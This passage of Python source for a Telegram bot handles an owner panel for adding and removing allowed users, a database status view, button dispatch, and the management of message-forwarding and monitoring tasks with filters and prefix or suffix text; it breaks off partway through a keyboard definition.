async def handle_add_user_admin_choice_input(update: Update, context: ContextTypes.DEFAULT_TYPE, target_user_id: int):
    query = update.callback_query
    
    message_text = f"""➕ **Add New User**

Step 2 of 2: Should user `{target_user_id}` be an admin?

**Options:**
• **Yes** - User will have admin privileges (👑)
• **No** - Regular user only (👤)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
    
    keyboard = [
        [
            InlineKeyboardButton("✅ Yes (Admin)", callback_data="owner_add_user_admin_yes"),
            InlineKeyboardButton("❌ No (Regular)", callback_data="owner_add_user_admin_no")
        ],
        [InlineKeyboardButton("❌ Cancel", callback_data="owner_cancel")]
    ]
    
    await query.edit_message_text(
        message_text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )
    
    context.user_data["add_user_id"] = target_user_id
    context.user_data["add_user_step"] = "admin_choice"
    context.user_data["awaiting_input"] = False

async def handle_add_user_admin_choice(update: Update, context: ContextTypes.DEFAULT_TYPE, target_user_id: int, is_admin: bool):
    query = update.callback_query
    user_id = query.from_user.id
    
    added = await db_call(db.add_allowed_user, target_user_id, None, is_admin, user_id)
    if added:
        role = "👑 Admin" if is_admin else "👤 User"
        await query.edit_message_text(
            f"✅ **User added successfully!**\n\nID: `{target_user_id}`\nRole: {role}",
            parse_mode="Markdown"
        )
        try:
            await context.bot.send_message(target_user_id, "✅ You have been added. Send /start to begin.", parse_mode="Markdown")
        except Exception:
            pass
    else:
        await query.edit_message_text(
            f"❌ **User `{target_user_id}` already exists!**\n\nUse /ownersets to try again.",
            parse_mode="Markdown"
        )
    
    context.user_data.clear()

async def handle_add_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    
    if context.user_data.get("owner_action") != "add_user":
        return
    
    step = context.user_data.get("add_user_step")
    
    if step == "user_id":
        try:
            target_user_id = int(text)
            context.user_data["add_user_id"] = target_user_id
            
            message_text = f"""➕ **Add New User**

Step 2 of 2: Should user `{target_user_id}` be an admin?

**Options:**
• **Yes** - User will have admin privileges (👑)
• **No** - Regular user only (👤)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
            
            keyboard = [
                [
                    InlineKeyboardButton("✅ Yes (Admin)", callback_data="owner_add_user_admin_yes"),
                    InlineKeyboardButton("❌ No (Regular)", callback_data="owner_add_user_admin_no")
                ],
                [InlineKeyboardButton("❌ Cancel", callback_data="owner_cancel")]
            ]
            
            await update.message.reply_text(
                message_text,
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode="Markdown"
            )
            
            context.user_data["add_user_step"] = "admin_choice"
            context.user_data["awaiting_input"] = False
            
        except ValueError:
            await update.message.reply_text(
                "❌ **Invalid user ID!**\n\nUser ID must be a number.\n\nUse /ownersets to try again.",
                parse_mode="Markdown"
            )
            context.user_data.clear()

async def handle_remove_user_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    
    message_text = """➖ **Remove User**

Enter the User ID to remove:

**Example:** `123456789`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
    
    keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="owner_cancel")]]
    
    await query.edit_message_text(
        message_text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )
    
    context.user_data["owner_action"] = "remove_user"
    context.user_data["awaiting_input"] = True

async def handle_remove_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    
    if context.user_data.get("owner_action") != "remove_user":
        return
    
    try:
        target_user_id = int(text)
    except ValueError:
        await update.message.reply_text(
            "❌ **Invalid user ID!**\n\nUser ID must be a number.\n\nUse /ownersets to try again.",
            parse_mode="Markdown"
        )
        context.user_data.clear()
        return
    
    context.user_data["remove_user_id"] = target_user_id
    
    message_text = f"""⚠️ **Confirm User Removal**

Are you sure you want to remove user `{target_user_id}`?

This will:
• Remove their access to the bot
• Disconnect their session if active
• Delete all their forwarding tasks
• Delete all their monitoring tasks
• Remove them from the allowed users list

**This action cannot be undone!**

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
    
    keyboard = [
        [
            InlineKeyboardButton("✅ Yes, Remove", callback_data=f"owner_confirm_remove_{target_user_id}"),
            InlineKeyboardButton("❌ No, Cancel", callback_data="owner_cancel_remove")
        ]
    ]
    
    await update.message.reply_text(
        message_text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )
    
    context.user_data["awaiting_input"] = False

async def handle_confirm_remove_user(update: Update, context: ContextTypes.DEFAULT_TYPE, target_user_id: int):
    query = update.callback_query
    user_id = query.from_user.id
    
    # Remove from allowed users
    removed = await db_call(db.remove_allowed_user, target_user_id)
    
    if removed:
        # Disconnect client if active
        if target_user_id in user_clients:
            try:
                client = user_clients[target_user_id]
                
                # Remove forwarding handlers
                if target_user_id in forward_handler_registered:
                    handler = forward_handler_registered.get(target_user_id)
                    if handler:
                        try:
                            client.remove_event_handler(handler)
                        except Exception:
                            pass
                    forward_handler_registered.pop(target_user_id, None)
                
                # Remove monitoring handlers
                if target_user_id in monitor_handler_registered:
                    for handler in monitor_handler_registered[target_user_id]:
                        try:
                            client.remove_event_handler(handler)
                        except Exception:
                            pass
                    monitor_handler_registered.pop(target_user_id, None)
                
                await client.disconnect()
            except Exception:
                logger.exception("Error disconnecting client for removed user %s", target_user_id)
            finally:
                user_clients.pop(target_user_id, None)
        
        # Mark user as logged out
        try:
            await db_call(db.save_user, target_user_id, None, None, None, False)
        except Exception:
            logger.exception("Error saving user logged_out state for %s", target_user_id)
        
        # Clear all caches
        phone_verification_states.pop(target_user_id, None)
        forwarding_tasks_cache.pop(target_user_id, None)
        monitoring_tasks_cache.pop(target_user_id, None)
        target_entity_cache.pop(target_user_id, None)
        chat_entity_cache.pop(target_user_id, None)
        user_send_semaphores.pop(target_user_id, None)
        user_rate_limiters.pop(target_user_id, None)
        reply_states.pop(target_user_id, None)
        auto_reply_states.pop(target_user_id, None)
        
        await query.edit_message_text(
            f"✅ **User `{target_user_id}` removed successfully!**",
            parse_mode="Markdown"
        )
        
        # Notify removed user
        try:
            await context.bot.send_message(target_user_id, "❌ You have been removed. Contact the owner to regain access.", parse_mode="Markdown")
        except Exception:
            pass
    else:
        await query.edit_message_text(
            f"❌ **User `{target_user_id}` not found!**",
            parse_mode="Markdown"
        )
    
    context.user_data.clear()

async def handle_db_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    
    status = await db_call(db.get_db_status)
    
    message_text = "📊 **Database Status**\n\n"
    message_text += f"**Type:** {status.get('type', 'PostgreSQL')}\n"
    message_text += f"**Connected:** {'✅ Yes' if status.get('connected') else '❌ No'}\n"
    
    message_text += f"\n**Cache Counts:**\n"
    cache_counts = status.get('cache_counts', {})
    message_text += f"• Users: {cache_counts.get('users', 0)}\n"
    message_text += f"• Forwarding Tasks: {cache_counts.get('forwarding_tasks', 0)}\n"
    message_text += f"• Monitoring Tasks: {cache_counts.get('monitoring_tasks', 0)}\n"
    message_text += f"• Allowed Users: {cache_counts.get('allowed_users', 0)}\n"
    message_text += f"• Admins: {cache_counts.get('admins', 0)}\n"
    
    if status.get('tables'):
        message_text += f"\n**Tables:** {', '.join(status['tables'])}"
    
    if status.get('error'):
        message_text += f"\n\n⚠️ **Error:** {status['error']}"
    
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="owner_panel")]]
    
    await query.edit_message_text(
        message_text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )

# ============================
# BUTTON HANDLER
# ============================
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id

    if not await check_authorization(update, context):
        return

    if await check_phone_number_required(user_id):
        await query.answer()
        await ask_for_phone_number(user_id, query.message.chat.id, context)
        return

    await query.answer()

    action = query.data
    
    if action == "login":
        await query.message.delete()
        await login_command(update, context)
    elif action == "logout":
        await query.message.delete()
        await logout_command(update, context)
    elif action == "show_forward_tasks":
        await query.message.delete()
        await fortasks_command(update, context)
    elif action == "show_monitor_tasks":
        await query.message.delete()
        await monitortasks_command(update, context)
    elif action.startswith("chatids_"):
        if action == "chatids_back":
            await show_chat_categories(user_id, query.message.chat.id, query.message.message_id, context)
        else:
            parts = action.split("_")
            category = parts[1]
            page = int(parts[2])
            await show_categorized_chats(user_id, query.message.chat.id, query.message.message_id, category, page, context)
    elif action.startswith("forward_task_"):
        await handle_forward_task_menu(update, context)
    elif action.startswith("monitor_task_"):
        await handle_monitor_task_menu(update, context)
    elif action.startswith("forward_filter_"):
        await handle_forward_filter_menu(update, context)
    elif action.startswith("toggle_forward_"):
        await handle_toggle_forward_action(update, context)
    elif action.startswith("toggle_monitor_"):
        await handle_toggle_monitor_action(update, context)
    elif action.startswith("delete_forward_"):
        await handle_delete_forward_action(update, context)
    elif action.startswith("delete_monitor_"):
        await handle_delete_monitor_action(update, context)
    elif action.startswith(("prefix_", "suffix_")):
        await handle_prefix_suffix(update, context)
    elif action.startswith("confirm_delete_forward_"):
        await handle_confirm_delete_forward(update, context)
    elif action.startswith("confirm_delete_monitor_"):
        await handle_confirm_delete_monitor(update, context)
    elif action == "owner_panel":
        await show_owner_panel(update, context)
    
    elif action.startswith("owner_"):
        await handle_owner_actions(update, context)
    
    elif action.startswith("reply_"):
        await handle_reply_action(update, context)
    
    elif action == "back_to_main":
        await show_main_menu(update, context, user_id)

# ============================
# FORWARDING SYSTEM COMMANDS
# ============================
async def forwadd_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if not await check_authorization(update, context):
        return

    if await check_phone_number_required(user_id):
        await ask_for_phone_number(user_id, update.message.chat.id, context)
        return

    user = await db_call(db.get_user, user_id)
    if not user or not user["is_logged_in"]:
        await update.message.reply_text(
            "❌ **You need to connect your account first!**\n\nUse /login to connect.",
            parse_mode="Markdown"
        )
        return

    task_creation_states[user_id] = {
        "step": "waiting_name",
        "type": "forwarding",
        "name": "",
        "source_ids": [],
        "target_ids": []
    }

    await update.message.reply_text(
        "🎯 **Let's create a new forwarding task!**\n\n📝 **Step 1 of 3:** Please enter a name for your task.\n\n💡 *Example: My Forwarding Task*",
        parse_mode="Markdown"
    )

async def fortasks_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id if update.effective_user else update.callback_query.from_user.id

    if not await check_authorization(update, context):
        return

    if await check_phone_number_required(user_id):
        message = update.message if update.message else update.callback_query.message
        await ask_for_phone_number(user_id, message.chat.id, context)
        return

    message = update.message if update.message else update.callback_query.message
    tasks = forwarding_tasks_cache.get(user_id, [])

    if not tasks:
        await message.reply_text(
            "📋 **No Active Forwarding Tasks**\n\nYou don't have any forwarding tasks yet.\n\nCreate one with:\n/forwadd",
            parse_mode="Markdown"
        )
        return

    task_list = "📋 **Your Forwarding Tasks**\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    
    keyboard = []
    
    for i, task in enumerate(tasks, 1):
        task_list += f"{i}. **{task['label']}**\n   📥 Sources: {', '.join(map(str, task['source_ids']))}\n   📤 Targets: {', '.join(map(str, task['target_ids']))}\n\n"
        keyboard.append([InlineKeyboardButton(f"{i}. {task['label']}", callback_data=f"forward_task_{task['label']}")])

    task_list += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    task_list += f"Total: **{len(tasks)} task(s)**\n\n💡 **Tap any task below to manage it!**"

    await message.reply_text(
        task_list,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )

async def handle_forward_task_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    task_label = query.data.replace("forward_task_", "")
    
    if await check_phone_number_required(user_id):
        await query.answer()
        await ask_for_phone_number(user_id, query.message.chat.id, context)
        return
    
    user_tasks = forwarding_tasks_cache.get(user_id, [])
    task = None
    for t in user_tasks:
        if t["label"] == task_label:
            task = t
            break
    
    if not task:
        await query.answer("Task not found!", show_alert=True)
        return
    
    filters = task.get("filters", {})
    
    outgoing_emoji = "✅" if filters.get("outgoing", True) else "❌"
    forward_tag_emoji = "✅" if filters.get("forward_tag", False) else "❌"
    control_emoji = "✅" if filters.get("control", True) else "❌"
    
    message_text = f"🔧 **Forward Task Management: {task_label}**\n\n📥 **Sources:** {', '.join(map(str, task['source_ids']))}\n📤 **Targets:** {', '.join(map(str, task['target_ids']))}\n\n⚙️ **Settings:**\n{outgoing_emoji} Outgoing - Controls if outgoing messages are forwarded\n{forward_tag_emoji} Forward Tag - Shows/hides 'Forwarded from' tag\n{control_emoji} Control - Pauses/runs forwarding\n\n💡 **Tap any option below to change it!**"
    
    keyboard = [
        [InlineKeyboardButton("🔍 Filters", callback_data=f"forward_filter_{task_label}")],
        [
            InlineKeyboardButton(f"{outgoing_emoji} Outgoing", callback_data=f"toggle_forward_{task_label}_outgoing"),
            InlineKeyboardButton(f"{forward_tag_emoji} Forward Tag", callback_data=f"toggle_forward_{task_label}_forward_tag")
        ],
        [
            InlineKeyboardButton(f"{control_emoji} Control", callback_data=f"toggle_forward_{task_label}_control"),
            InlineKeyboardButton("🗑️ Delete", callback_data=f"delete_forward_{task_label}")
        ],
        [InlineKeyboardButton("🔙 Back to Forward Tasks", callback_data="show_forward_tasks")]
    ]
    
    await query.edit_message_text(
        message_text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )

async def handle_forward_filter_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    task_label = query.data.replace("forward_filter_", "")
    
    if await check_phone_number_required(user_id):
        await query.answer()
        await ask_for_phone_number(user_id, query.message.chat.id, context)
        return
    
    user_tasks = forwarding_tasks_cache.get(user_id, [])
    task = None
    for t in user_tasks:
        if t["label"] == task_label:
            task = t
            break
    
    if not task:
        await query.answer("Task not found!", show_alert=True)
        return
    
    filters = task.get("filters", {})
    filter_settings = filters.get("filters", {})
    
    raw_text_emoji = "✅" if filter_settings.get("raw_text", False) else "❌"
    numbers_only_emoji = "✅" if filter_settings.get("numbers_only", False) else "❌"
    alphabets_only_emoji = "✅" if filter_settings.get("alphabets_only", False) else "❌"
    removed_alphabetic_emoji = "✅" if filter_settings.get("removed_alphabetic", False) else "❌"
    removed_numeric_emoji = "✅" if filter_settings.get("removed_numeric", False) else "❌"
    
    prefix = filter_settings.get("prefix", "")
    suffix = filter_settings.get("suffix", "")
    prefix_text = f"'{prefix}'" if prefix else "Not set"
    suffix_text = f"'{suffix}'" if suffix else "Not set"
    
    message_text = f"🔍 **Filters for: {task_label}**\n\nApply filters to messages before forwarding:\n\n📋 **Available Filters:**\n{raw_text_emoji} Raw text - Forward any text\n{numbers_only_emoji} Numbers only - Forward only numbers\n{alphabets_only_emoji} Alphabets only - Forward only letters\n{removed_alphabetic_emoji} Removed Alphabetic - Keep letters & special chars, remove numbers & emojis\n{removed_numeric_emoji} Removed Numeric - Keep numbers & special chars, remove letters & emojis\n📝 **Prefix:** {prefix_text}\n📝 **Suffix:** {suffix_text}\n\n💡 **Multiple filters can be active at once!**"
    
    keyboard = [
        [
            InlineKeyboardButton(f"{raw_text_emoji} Raw text", callback_data=f"toggle_forward_{task_label}_raw_text"),
            InlineKeyboardButton(f"{numbers_only_emoji} Numbers only", callback_data=f"toggle_forward_{task_label}_numbers_only")
        ],
        [
            InlineKeyboardButton(f"{alphabets_only_emoji} Alphabets only", callback_data=f"toggle_forward_{task_label}_alphabets_only"),
            InlineKeyboardButton(f"{removed_alphabetic_emoji} Removed Alphabetic", callback_data=f"toggle_forward_{task_label}_removed_alphabetic")
        ],
        [
            InlineKeyboardButton(f"{removed_numeric_emoji} Removed Numeric", callback_data=f"toggle_forward_{task_label}_removed_numeric"),
            InlineKeyboardButton("📝 Prefix/Suffix", callback_data=f"toggle_forward_{task_label}_prefix_suffix")
        ],
        [InlineKeyboardButton("🔙 Back to Task", callback_data=f"forward_task_{task_label}")]
    ]
    
    await query.edit_message_text(
        message_text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )

async def handle_toggle_forward_action(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    data_parts = query.data.replace("toggle_forward_", "").split("_")
    
    if len(data_parts) < 2:
        await query.answer("Invalid action!", show_alert=True)
        return
    
    task_label = data_parts[0]
    toggle_type = "_".join(data_parts[1:])
    
    user_tasks = forwarding_tasks_cache.get(user_id, [])
    task_index = -1
    for i, t in enumerate(user_tasks):
        if t["label"] == task_label:
            task_index = i
            break
    
    if task_index == -1:
        await query.answer("Task not found!", show_alert=True)
        return
    
    task = user_tasks[task_index]
    filters = task.get("filters", {})
    new_state = None
    status_text = ""
    
    if toggle_type == "outgoing":
        new_state = not filters.get("outgoing", True)
        filters["outgoing"] = new_state
        status_text = "Outgoing messages"
        
    elif toggle_type == "forward_tag":
        new_state = not filters.get("forward_tag", False)
        filters["forward_tag"] = new_state
        status_text = "Forward tag"
        
    elif toggle_type == "control":
        new_state = not filters.get("control", True)
        filters["control"] = new_state
        status_text = "Forwarding control"
        
    elif toggle_type in ["raw_text", "numbers_only", "alphabets_only", "removed_alphabetic", "removed_numeric"]:
        filter_settings = filters.get("filters", {})
        new_state = not filter_settings.get(toggle_type, False)
        filter_settings[toggle_type] = new_state
        filters["filters"] = filter_settings
        status_text = toggle_type.replace('_', ' ').title()
        
    elif toggle_type == "prefix_suffix":
        await show_prefix_suffix_menu(query, task_label, "forward")
        return
    
    elif toggle_type == "clear_prefix_suffix":
        filter_settings = filters.get("filters", {})
        filter_settings["prefix"] = ""
        filter_settings["suffix"] = ""
        filters["filters"] = filter_settings
        new_state = False
        task["filters"] = filters
        forwarding_tasks_cache[user_id][task_index] = task
        
        asyncio.create_task(
            db_call(db.update_task_filters, user_id, task_label, filters)
        )
        
        await query.answer("✅ Prefix and suffix cleared!")
        await handle_forward_filter_menu(update, context)
        return
    
    else:
        await query.answer(f"Unknown toggle type: {toggle_type}")
        return
    
    task["filters"] = filters
    forwarding_tasks_cache[user_id][task_index] = task
    
    new_emoji = "✅" if new_state else "❌"
    status_display = "✅ On" if new_state else "❌ Off"
    
    try:
        keyboard = query.message.reply_markup.inline_keyboard
        new_keyboard = []
        for row in keyboard:
            new_row = []
            for button in row:
                if button.callback_data == query.data:
                    current_text = button.text
                    if "✅ " in current_text:
                        text_without_emoji = current_text.split("✅ ", 1)[1]
                        new_text = f"{new_emoji} {text_without_emoji}"
                    elif "❌ " in current_text:
                        text_without_emoji = current_text.split("❌ ", 1)[1]
                        new_text = f"{new_emoji} {text_without_emoji}"
                    elif current_text.startswith("✅"):
                        text_without_emoji = current_text[1:]
                        new_text = f"{new_emoji}{text_without_emoji}"
                    elif current_text.startswith("❌"):
                        text_without_emoji = current_text[1:]
                        new_text = f"{new_emoji}{text_without_emoji}"
                    else:
                        new_text = f"{new_emoji} {current_text}"
                    
                    new_row.append(InlineKeyboardButton(new_text, callback_data=query.data))
                else:
                    new_row.append(button)
            new_keyboard.append(new_row)
        
        await query.edit_message_reply_markup(
            reply_markup=InlineKeyboardMarkup(new_keyboard)
        )
        await query.answer(f"{status_text}: {status_display}")
    except Exception:
        await query.answer(f"{status_text}: {status_display}")
        if toggle_type in ["outgoing", "forward_tag", "control"]:
            await handle_forward_task_menu(update, context)
        else:
            await handle_forward_filter_menu(update, context)
    
    asyncio.create_task(
        db_call(db.update_task_filters, user_id, task_label, filters)
    )

async def show_prefix_suffix_menu(query, task_label: str, task_type: str):
    user_id = query.from_user.id
    
    if task_type == "forward":
        user_tasks = forwarding_tasks_cache.get(user_id, [])
        task_key = "filters"
        filter_key = "filters"
    else:
        user_tasks = monitoring_tasks_cache.get(user_id, [])
        task_key = "settings"
        filter_key = None  # Monitoring tasks don't use prefix/suffix
    
    task = None
    for t in user_tasks:
        if t["label"] == task_label:
            task = t
            break
    
    if not task:
        await query.answer("Task not found!", show_alert=True)
        return
    
    if task_type == "forward":
        filters = task.get("filters", {})
        filter_settings = filters.get("filters", {})
        prefix = filter_settings.get("prefix", "")
        suffix = filter_settings.get("suffix", "")
    else:
        # Monitoring tasks don't have prefix/suffix
        await query.answer("Prefix/suffix only available for forwarding tasks!")
        return
    
    message_text = f"🔤 **Prefix/Suffix Setup for: {task_label}**\n\nAdd custom text to messages:\n\n📝 **Current Prefix:** '{prefix}'\n📝 **Current Suffix:** '{suffix}'\n\n💡 **Examples:**\n• Prefix '🔔 ' adds a bell before each message\n• Suffix ' ✅' adds a checkmark after\n• Use any characters: emojis, signs, numbers, letters\n\n**Tap an option below to set it!**"
    
    keyboard = [
        [InlineKeyboardButton("➕ Set Prefix", callback_data=f"prefix_{task_label}_{task_type}")],
        [InlineKeyboardButton("➕ Set Suffix", callback_data=f"suffix_{task_label}_{task_type}")],
        [InlineKeyboardButton("🗑️ Clear Prefix/Suffix", callback_data=f"toggle_{task_type}_{task_label}_clear_prefix_suffix")],
        [InlineKeyboardButton("🔙 Back to Filters", callback_data=f"{task_type}_filter_{task_label}")]
    ]
    
    await query.edit_message_text(
        message_text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )

async def handle_prefix_suffix(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    data_parts = query.data.split("_")
    
    if len(data_parts) < 3:
        await query.answer("Invalid action!", show_alert=True)
        return
    
    action_type = data_parts[0]  # prefix or suffix
    task_label = data_parts[1]
    task_type = data_parts[2]  # forward or monitor
    
    if task_type != "forward":
        await query.answer("Prefix/suffix only available for forwarding tasks!")
        return
    
    context.user_data[f"waiting_{action_type}"] = {"task_label": task_label, "task_type": task_type}
    await query.edit_message_text(
        f"📝 **Enter the {action_type} text for task '{task_label}':**\n\nType your {action_type} text now.\n💡 *You can use any characters: emojis 🔔, signs ⚠️, numbers 123, letters ABC*\n\n**Example:** If you want the {action_type} '🔔 ', type: 🔔 ",
        parse_mode="Markdown"
    )

async def handle_prefix_suffix_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    
    waiting_data = context.user_data.get("waiting_prefix") or context.user_data.get("waiting_suffix")
    if not waiting_data:
        return
    
    action_type = "prefix" if "waiting_prefix" in context.user_data else "suffix"
    task_label = waiting_data["task_label"]
    task_type = waiting_data["task_type"]
    
    # Clear the waiting state
    if "waiting_prefix" in context.user_data:
        del context.user_data["waiting_prefix"]
    if "waiting_suffix" in context.user_data:
        del context.user_data["waiting_suffix"]
    
    if task_type == "forward":
        user_tasks = forwarding_tasks_cache.get(user_id, [])
        task_index = -1
        for i, t in enumerate(user_tasks):
            if t["label"] == task_label:
                task_index = i
                break
        
        if task_index == -1:
            await update.message.reply_text("❌ Task not found!")
            return
        
        task = user_tasks[task_index]
        filters = task.get("filters", {})
        filter_settings = filters.get("filters", {})
        
        if action_type == "prefix":
            filter_settings["prefix"] = text
            confirmation = f"✅ **Prefix set to:** '{text}'"
        else:
            filter_settings["suffix"] = text
            confirmation = f"✅ **Suffix set to:** '{text}'"
        
        filters["filters"] = filter_settings
        task["filters"] = filters
        forwarding_tasks_cache[user_id][task_index] = task
        
        asyncio.create_task(
            db_call(db.update_task_filters, user_id, task_label, filters)
        )
        
        await update.message.reply_text(
            f"{confirmation}\n\nTask: **{task_label}**\n\nAll messages will now include this text when forwarded!",
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text("❌ Prefix/suffix only available for forwarding tasks!")

async def handle_delete_forward_action(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    task_label = query.data.replace("delete_forward_", "")
    
    if await check_phone_number_required(user_id):
        await query.answer()
        await ask_for_phone_number(user_id, query.message.chat.id, context)
        return
    
    message_text = f"🗑️ **Delete Forwarding Task: {task_label}**\n\n⚠️ **Are you sure you want to delete this task?**\n\nThis action cannot be undone!\nAll forwarding will stop immediately."
    
    keyboard = [
        [
            InlineKeyboardButton("✅ Yes, Delete", callback_data=f"confirm_delete_forward_{task_label}"),
            InlineKeyboardButton("❌ Cancel", callback_data=f"forward_task_{task_label}")
        ]
    ]
    
    await query.edit_message_text(
        message_text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )

async def handle_confirm_delete_forward(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    task_label = query.data.replace("confirm_delete_forward_", "")
    
    if await check_phone_number_required(user_id):
        await query.answer()
        await ask_for_phone_number(user_id, query.message.chat.id, context)
        return
    
    deleted = await db_call(db.remove_forwarding_task, user_id, task_label)
    
    if deleted:
        if user_id in forwarding_tasks_cache:
            forwarding_tasks_cache[user_id] = [t for t in forwarding_tasks_cache[user_id] if t.get("label") != task_label]
        
        # Update forwarding handlers
        if user_id in user_clients:
            await update_forwarding_for_user(user_id)
        
        await query.edit_message_text(
            f"✅ **Task '{task_label}' deleted successfully!**\n\nAll forwarding for this task has been stopped.",
            parse_mode="Markdown"
        )
    else:
        await query.edit_message_text(
            f"❌ **Task '{task_label}' not found!**",
            parse_mode="Markdown"
        )

# ============================
# MONITORING SYSTEM COMMANDS
# ============================
async def monitoradd_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not await check_authorization(update, context):
        return
    
    if await check_phone_number_required(user_id):
        await ask_for_phone_number(user_id, update.message.chat.id, context)
        return
    
    user = await db_call(db.get_user, user_id)
    if not user or not user.get("is_logged_in"):
        await update.message.reply_text(
            "❌ **You need to connect your account first!**\n\nUse /login to connect your Telegram account.",
            parse_mode="Markdown"
        )
        return
    
    task_creation_states[user_id] = {
        "step": "waiting_name",
        "type": "monitoring",
        "name": "",
        "chat_ids": []
    }
    
    await update.message.reply_text(
        "🎯 **Let's create a new monitoring task!**\n\n"
        "📝 **Step 1 of 2:** Please enter a name for your monitoring task.\n\n"
        "💡 *Example: Group Duplicate Checker*",
        parse_mode="Markdown"
    )

async def monitortasks_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message:
        user_id = update.effective_user.id
        message = update.message
    else:
        user_id = update.callback_query.from_user.id
        message = update.callback_query.message
    
    if not await check_authorization(update, context):
        return
    
    if await check_phone_number_required(user_id):
        await ask_for_phone_number(user_id, message.chat.id, context)
        return
    
    tasks = monitoring_tasks_cache.get(user_id, [])
    
    if not tasks:
        await message.reply_text(
            "📋 **No Active Monitoring Tasks**\n\n"
            "You don't have any monitoring tasks yet.\n\n"
            "Create one with:\n"
            "/monitoradd",
            parse_mode="Markdown"
        )
        return
    
    task_list = "📋 **Your Monitoring Tasks**\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    keyboard = []
    
    for i, task in enumerate(tasks, 1):
        task_list += f"{i}. **{task['label']}**\n"
        task_list += f"   📥 Monitoring: {', '.join(map(str, task['chat_ids']))}\n\n"
        keyboard.append([InlineKeyboardButton(f"{i}. {task['label']}", callback_data=f"monitor_task_{task['label']}")])
    
    task_list += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\nTotal: **{len(tasks)} task(s)**\n\n💡 **Tap any task below to manage it!**"
    
    await message.reply_text(
        task_list,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )

async def handle_monitor_task_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    task_label = query.data.replace("monitor_task_", "")
    
    if await check_phone_number_required(user_id):
        await query.answer()
        await ask_for_phone_number(user_id, query.message.chat.id, context)
        return
    
    user_tasks = monitoring_tasks_cache.get(user_id, [])
    task = next((t for t in user_tasks if t["label"] == task_label), None)
    
    if not task:
        await query.answer("Task not found!", show_alert=True)
        return
    
    settings = task.get("settings", {})
    
    check_duo_emoji = "✅" if settings.get("check_duplicate_and_notify", True) else "❌"
    manual_reply_emoji = "✅" if settings.get("manual_reply_system", True) else "❌"
    auto_reply_emoji = "✅" if settings.get("auto_reply_system", False) else "❌"
    outgoing_emoji = "✅" if settings.get("outgoing_message_monitoring", True) else "❌"
    
    auto_reply_message = settings.get("auto_reply_message", "")
    auto_reply_display = f"Auto Reply = '{auto_reply_message[:30]}{'...' if len(auto_reply_message) > 30 else ''}'" if auto_reply_message else "Auto Reply = Off"
    
    message_text = f"🔧 **Monitor Task Management: {task_label}**\n\n"
    message_text += f"📥 **Monitoring Chats:** {', '.join(map(str, task['chat_ids']))}\n\n"
    message_text += "⚙️ **Settings:**\n"
    message_text += f"{check_duo_emoji} Check Duo & Notify - Detects duplicates and sends alerts\n"
    message_text += f"{manual_reply_emoji} Manual reply system - Allows manual replies to duplicates\n"
    message_text += f"{auto_reply_emoji} {auto_reply_display}\n"
    message_text += f"{outgoing_emoji} Outgoing Message monitoring - Monitors your outgoing messages\n\n"
    message_text += "💡 **Tap any option below to change it!**"
    
    keyboard = [
        [
            InlineKeyboardButton(f"{check_duo_emoji} Check Duo & Notify", callback_data=f"toggle_monitor_{task_label}_check_duplicate_and_notify"),
            InlineKeyboardButton(f"{manual_reply_emoji} Manual Reply", callback_data=f"toggle_monitor_{task_label}_manual_reply_system")
        ],
        [
            InlineKeyboardButton(f"{auto_reply_emoji} Auto Reply", callback_data=f"toggle_monitor_{task_label}_auto_reply_system"),
            InlineKeyboardButton(f"{outgoing_emoji} Outgoing", callback_data=f"toggle_monitor_{task_label}_outgoing_message_monitoring")
        ],
        [InlineKeyboardButton("🗑️ Delete", callback_data=f"delete_monitor_{task_label}")],
